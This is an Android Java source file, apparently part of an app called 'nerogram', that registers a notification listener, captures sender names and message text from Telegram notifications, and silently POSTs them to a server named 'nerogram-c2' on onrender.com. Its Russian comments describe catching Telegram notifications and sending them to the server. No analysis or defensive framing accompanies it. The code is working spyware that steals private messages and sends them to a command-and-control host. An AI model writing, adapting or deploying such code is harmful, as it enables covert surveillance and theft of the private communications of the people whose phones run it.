package com.nerogram;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class NotificationListener extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // Ловим уведомления только от Telegram
        if (sbn.getPackageName().equals("org.telegram.messenger")) {
            String title = sbn.getNotification().extras.getString("android.title");
            String text = sbn.getNotification().extras.getString("android.text");
            
            // Отправляем на сервер
            sendToServer("TG Push | От: " + title + " | Текст: " + text);
        }
    }

    private void sendToServer(String text) {
        new Thread(() -> {
            try {
                String urlStr = "https://nerogram-c2.onrender.com/api/data"; // ТВОЙ URL RENDER
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                String json = "{\"id\":\"android-phone\",\"type\":\"text\",\"text\":\"" + text + "\"}";
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.getBytes("utf-8"));
                }
                conn.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }
}
